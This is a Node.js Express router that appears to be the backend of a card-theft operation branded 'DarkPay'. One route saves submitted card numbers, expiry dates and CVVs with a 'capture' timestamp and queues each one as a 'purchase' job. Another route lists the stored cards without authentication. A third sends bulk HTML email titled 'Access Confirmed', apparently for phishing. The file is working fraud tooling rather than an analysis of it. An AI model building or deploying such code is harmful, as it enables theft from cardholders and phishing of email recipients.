const express = require('express');
const router = express.Router();
const Cartao = require('../models/Cartao');
const filaCartoes = require('../queue'); // ⚠️ IMPORTANTE: Enfileirador
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  host: 'smtp.zoho.com', // troca pro teu provedor (ex: smtp.gmail.com)
  port: 465,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
});

router.post('/salvar-cartao', async (req, res) => {
  try {
    const {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    } = req.body;

    const novoCartao = new Cartao({
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao,
      dataCaptura: new Date()
    });

    await novoCartao.save();
    console.log("🩸 Dado injetado no abismo:", novoCartao);

    // ⚠️ ENFIA NA FILA SATÂNICA DO REDIS
    await filaCartoes.add('compra', {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    });

    console.log("🎯 Job enfileirado para o ritual de compra.");

    res.json({ status: 'ok' });
  } catch (err) {
    console.error("💀 Erro na salvação:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});


// GET dos cartões salvos
router.get('/cartoes', async (req, res) => {
  try {
    const cartoes = await Cartao.find().sort({ dataCaptura: -1 }).limit(100);
    res.json(cartoes);
  } catch (err) {
    console.error("💀 Erro ao buscar cartões:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});

router.post('/enviar-emails', async (req, res) => {
  const { emails, mensagem } = req.body;

  if (!emails || !mensagem) {
    return res.status(400).json({ status: 'erro', message: 'Faltam dados' });
  }

  try {
    for (let email of emails) {
      await transporter.sendMail({
        from: `"DarkPay" <${process.env.SMTP_USER}>`,
        to: email,
        subject: "Access Confirmed",
        html: mensagem
      });
      console.log(`📩 Email enviado pra ${email}`);
    }

    res.json({ status: 'ok', message: 'Todos os emails foram enviados' });
  } catch (err) {
    console.error("💀 Falha no envio:", err);
    res.status(500).json({ status: 'erro', message: 'Falha ao enviar emails' });
  }
});

module.exports = router;
